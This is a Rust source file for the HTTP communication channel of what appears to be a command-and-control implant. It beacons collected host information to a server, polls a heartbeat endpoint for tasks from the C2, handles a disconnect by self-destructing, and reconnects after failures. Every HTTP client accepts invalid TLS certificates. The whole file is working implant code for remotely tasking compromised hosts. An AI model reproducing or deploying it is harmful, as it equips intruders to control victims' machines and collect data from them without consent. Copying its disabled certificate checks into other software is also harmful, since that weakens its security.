use reqwest::Client;
use std::time::Duration;

use crate::communication::message::{AgentMessage, ServerMessage};
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;
use crate::communication::channels::channel::CommChannel;



pub struct HTTPCommChannel {
    pub address: String,
    pub retries: u64,
    pub timeout: u64
}

#[async_trait::async_trait]
impl CommChannel for HTTPCommChannel {
    async fn initial_beacon(&self, logger: &Logger, key: &Vec<u8>,
    ) -> (u64, String) {
        let address = format!("{}/beacon", self.address);

        let beacon = match crate::communication::channels::channel::get_info(key).await {
            Ok(beacon) => beacon,
            Err(e) => {
                logger.error(&format!("[-] Failed to get host info: {:?}", e));
                return (0, "NONE".to_string());
            }
        };
    
        let client = Client::builder()
            .timeout(Duration::from_secs(self.timeout))
            .danger_accept_invalid_certs(true) // <-- ONLY for dev/testing
            .build()
            .unwrap();
    
        for attempt in 1..=self.retries {
            logger.log(&format!(
                "[*] Attempting HTTP beacon (attempt {}/{})",
                attempt, self.retries
            ));

    
            let res = client
                .post(&address)
                .json(&beacon) // Assumes `beacon` is serializable with Serde
                .send()
                .await;
    
            match res {
                Ok(resp) => {
                    if resp.status().is_success() {
                        match resp.json::<ServerMessage>().await {
                            Ok(ServerMessage::Ack {
                                agent_id,
                                status,
                                session_id,
                            }) => {
                                logger.log(&format!(
                                    "[*] Received Ack from server (status: {})",
                                    status
                                ));
                                return (agent_id, session_id);
                            }
                            Ok(msg) => {
                                logger.error(&format!("[!] Unexpected message: {:?}", msg));
                                return (0, "NONE".to_string());
                            }
                            Err(e) => {
                                logger.error(&format!("[!] Failed to parse server response: {}", e));
                            }
                        }
                    } else {
                        logger.error(&format!(
                            "[!] Server responded with status: {}",
                            resp.status()
                        ));
                    }
                }
                Err(e) => {
                    logger.error(&format!("[!] Beacon attempt failed: {}", e));
                }
            }
        }
    
        logger.log(&format!(
            "[!] No Ack received after {} attempts. Operating offline.",
            self.retries
        ));

        (0, "NONE".to_string())
    }

    async fn heartbeat(&self, agent_id: u64, session_id: &str, 
        result: Option<Vec<String>>, logger: &Logger
    ) -> Option<Vec<AgentCommand>> {
        let address = format!("{}/heartbeat", self.address);


        let heartbeat = AgentMessage::Heartbeat { 
            agent_id, 
            session_id: session_id.to_string(), 
            result 
        };
    
        let client = Client::builder()
            .timeout(Duration::from_secs(self.timeout))
            .danger_accept_invalid_certs(true) // <-- ONLY for dev/testing
            .build()
            .unwrap();
    
        let res = client
            .post(address)
            .json(&heartbeat)
            .send()
            .await;
    
        match res {
            Ok(resp) => {
                let status = resp.status();
    
                if status.as_u16() == 204 {
                    logger.log("[*] Received NOOP from C2");
                    return Some(vec![AgentCommand::NOOP]);
                } else if status.is_success() {
                    match resp.json::<ServerMessage>().await {
                        Ok(ServerMessage::Task { 
                            agent_id: _, 
                            session_id: _, 
                            command 
                        }) => {
                            logger.log("[*] Received tasks from C2");
                            return Some(command)
                        }
                        Ok(ServerMessage::Disconnect { 
                            agent_id: _, 
                            session_id: _ 
                        }) => {
                            logger.log("[*] Received disconnect from C2");
                            return Some(vec![AgentCommand::SelfDestruct])
                        }
                        Ok(msg) => {
                            logger.error(&format!("[!] Unexpected message: {:?}", msg));
                            return Some(vec![AgentCommand::InvalidTask])            
                        }
                        Err(e) => {
                            logger.error(&format!("[!] Beacon attempt failed: {}", e));
                        }
                    }
                } else {
                    logger.error(&format!(
                        "[!] Server responded with status: {}",
                        resp.status()
                    ));
                }
            }
            Err(e) => {
                logger.error(&format!("[!] Beacon attempt failed: {}", e));
            }
        }
        return None
    }

    async fn reconnect(
        &self, agent_id: u64, session_id: &str, logger: &Logger,
    ) -> (u64, String) {
        let address = format!("{}/reconnect", self.address);
        
        let reconnect = AgentMessage::Reconnect {
            agent_id,
            session_id: session_id.to_string(),
        };
    
        let client = Client::builder()
            .timeout(Duration::from_secs(self.timeout))
            .danger_accept_invalid_certs(true) // <-- ONLY for dev/testing
            .build()
            .unwrap();
    
        let res = client.post(address).json(&reconnect).send().await;
    
        match res {
            Ok(resp) => {
                if resp.status().is_success() {
                    match resp.json::<ServerMessage>().await {
                        Ok(ServerMessage::Ack {
                            agent_id,
                            session_id,
                            status,
                        }) => {
                            logger.log(&format!(
                                "[*] Received Ack from server (status: {})",
                                status
                            ));
                            return (agent_id, session_id);
                        }
                        Ok(msg) => {
                            logger.error(&format!("[!] Unexpected message: {:?}", msg));
                            return (0, "NONE".to_string());
                        }
                        Err(e) => {
                            logger.error(&format!("[!] Failed to parse server response: {}", e));
                        }
                    }
                } else {
                    logger.error(&format!(
                        "[!] Server responded with status: {}",
                        resp.status()
                    ));
                }
            }
    
            Err(e) => {
                logger.error(&format!("[!] Beacon attempt failed: {}", e));
            }
        }
    
        logger.error("[!] Failed to reconnect. Continuing to operate offline.");
        (0, "NONE".to_string())
    }
}